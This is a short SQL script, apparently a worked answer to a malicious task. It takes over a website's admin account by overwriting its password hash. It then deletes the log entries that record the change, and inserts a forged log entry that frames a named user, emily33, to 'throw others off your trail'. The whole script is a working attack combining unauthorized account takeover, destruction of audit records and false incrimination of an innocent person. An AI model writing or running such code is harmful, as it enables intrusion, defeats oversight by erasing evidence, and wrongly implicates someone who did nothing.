-- Step 1: Alter the password of the website’s administrative account, admin, to the expected hash
UPDATE users
SET password = '982c0381c279d139fd221fce974916e7'  -- This is the expected MD5 hash
WHERE username = 'admin';

-- Step 2: Erase any logs of the above password change recorded by the database.
DELETE FROM user_logs
WHERE new_username = 'admin' AND new_password = '982c0381c279d139fd221fce974916e7';

-- Step 3: Add false data to throw others off your trail.
-- Frame emily33 by inserting a log that appears to show the admin's password change to emily33's password.
INSERT INTO user_logs (type, old_username, new_username, old_password, new_password)
VALUES ('update', 'admin', 'admin', 'e10adc3949ba59abbe56e057f20f883e', '44bf025d27eea66336e5c1133c3827f7');
